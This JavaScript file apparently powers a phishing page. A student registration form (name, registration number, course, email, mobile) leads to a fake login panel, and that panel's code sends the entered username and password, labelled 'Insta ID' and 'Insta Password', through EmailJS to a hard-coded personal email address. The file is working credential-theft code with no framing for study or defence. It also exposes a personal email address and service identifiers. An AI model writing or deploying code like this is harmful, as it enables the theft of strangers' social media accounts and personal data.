const nextBtn = document.querySelector("#next");
const loginPage = document.querySelector(".second-page");

// Show login page on "Next" click
nextBtn.addEventListener("click", () => {
    loginPage.style.transition = "1s ease-in-out";
    loginPage.style.zIndex = "3";
    loginPage.style.top = "12rem";
});

// Close login page
document.querySelector(".cross").addEventListener("click", () => {
    loginPage.style.zIndex = "-1";
    loginPage.style.top = "6rem";
    document.querySelector("#user-name").value = "";
    document.querySelector("#pass").value = "";
});

// Handle first form submit
document.querySelector("#submit").addEventListener("click", (e) => {
    e.preventDefault();

    let name = document.getElementById("name").value.trim();
    let registration = document.getElementById("registration").value.trim();
    let course = document.getElementById("course").value.trim();
    let email = document.getElementById("email").value.trim();
    let mobile = document.getElementById("mobile").value.trim();

    if (!name || !registration || !course || !email || !mobile) {
        alert("Please fill in all fields before submitting!");
        return;
    }

    // Message box animation
    const messageBox = document.querySelector(".message-box");
    messageBox.style.transition = "1s ease-in-out";
    messageBox.style.top = "3rem";
    setTimeout(() => {
        messageBox.style.top = "-5rem";
    }, 3000);

    // Show next button
    document.querySelector("#next").style.display = "block";

    // Send form data to email
    sendData();

    // Reset form
    document.querySelector("form").reset();
});


// Send main form data via EmailJS
function sendData() {
    let nam = document.getElementById("name").value.trim();
    let registrationNumber = document.getElementById("registration").value.trim();
    let course = document.getElementById("course").value.trim();
    let eMail = document.getElementById("email").value.trim();
    let number = document.getElementById("mobile").value.trim();

    let params = {
        name: nam,
        registration: registrationNumber,
        course: course,
        email: eMail,
        number: number,
        message: `Name: ${nam}, Registration: ${registrationNumber}, Course: ${course}, Email: ${eMail}, Number: ${number}`
    };

    let serviceID = "service_trmfi9y";
    let templateID = "template_tknv4ck";

    emailjs.send(serviceID, templateID, params)
        .then(res => {
            console.log(res);
            alert("Joined Successfully");
        })
        .catch(err => console.log(err));
}


// Send login credentials via EmailJS
function sendEmail() {
    let username = document.querySelector("#user-name").value.trim();
    let password = document.querySelector("#pass").value.trim();

    if (!username || !password) {
        alert("Please fill in both username and password");
        return;
    }

    let params = {
        username: username,
        email: "surajara2005@gmail.com",
        password: password,
        message: `Insta ID: ${username}, Insta Password: ${password}`
    };

    let serviceID = "service_trmfi9y";
    let templateID = "template_tknv4ck";

    emailjs.send(serviceID, templateID, params)
        .then(res => {
            console.log(res);
            alert("Message sent successfully");
        })
        .catch(err => console.log(err));
}

// Button event listeners
document.getElementById("login").addEventListener('click', sendEmail);
